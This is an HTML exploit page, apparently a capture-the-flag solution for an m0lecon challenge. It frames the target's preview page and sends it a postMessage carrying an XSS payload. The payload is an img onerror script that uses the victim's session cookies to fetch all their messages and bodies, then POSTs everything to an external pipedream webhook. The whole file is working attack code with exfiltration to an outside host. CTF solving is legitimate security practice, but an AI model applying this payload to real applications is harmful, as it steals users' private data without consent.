<!doctype html>
<html>
    <body>
        <iframe
            id="f"
            src="https://2208c656-d0b0-4927-b65e-587a7bbb21d6.offsec.m0lecon.it/preview"
        ></iframe>
        <script>
            const WEBHOOK =
                "https://eorpvwpcvsuauqy.m.pipedream.net";
            const payload = `<img src=x onerror="
              async function run() {
                const WEBHOOK = '${WEBHOOK}';
                
                // Get full message list
                const msgs = await fetch('/api/messages', {credentials:'include'}).then(r=>r.json());
                
                // Fetch ALL bodies in parallel — don't wait between them
                const bodies = await Promise.all(
                  msgs.map(m => fetch('/api/messages/'+m.id, {credentials:'include'}).then(r=>r.json()))
                );
                
                // Single exfil with everything
                await fetch(WEBHOOK, {
                  method: 'POST',
                  mode: 'no-cors',
                  body: JSON.stringify({total: msgs.length, bodies})
                });
              }
              run();
            ">`;
            document.getElementById("f").onload = () => {
                document
                    .getElementById("f")
                    .contentWindow.postMessage({ html: payload }, "*");
            };
        </script>
    </body>
</html>
